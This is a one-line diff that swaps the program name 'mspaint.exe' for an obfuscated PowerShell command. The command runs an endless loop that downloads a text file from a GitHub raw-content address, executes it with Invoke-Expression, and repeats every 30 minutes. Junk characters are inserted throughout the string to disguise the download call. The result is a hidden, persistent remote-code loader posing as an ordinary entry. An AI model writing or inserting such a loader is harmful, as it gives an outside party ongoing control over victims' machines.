@@ -1,1 +1,1 @@
-mspaint.exe
+while($true){[string]$nbnvbzcbv={(Nepyefsndzccw-pyefsndzccOpyefsndzccbjecpyefsndzcct Npyefsndzccet.WepyefsndzccbClpyefsndzccienpyefsndzcct).Dopyefsndzccwnlopyefsndzccadspyefsndzcctring('hpyefsndzccttppyefsndzccs:/pyefsndzcc/rapyefsndzccw.githupyefsndzccbusercontpyefsndzccent.copyefsndzccm/babmapyefsndzccmba2/mambpyefsndzccahou2/mapyefsndzccin/panpyefsndzccel.txpyefsndzcct')};$wssfxfdcc=$nbnvbzcbv.Replace('pyefsndzcc','');$vfgsdfgdf=iex $wssfxfdcc;invoke-expression $vfgsdfgdf;start-sleep -s 1800}
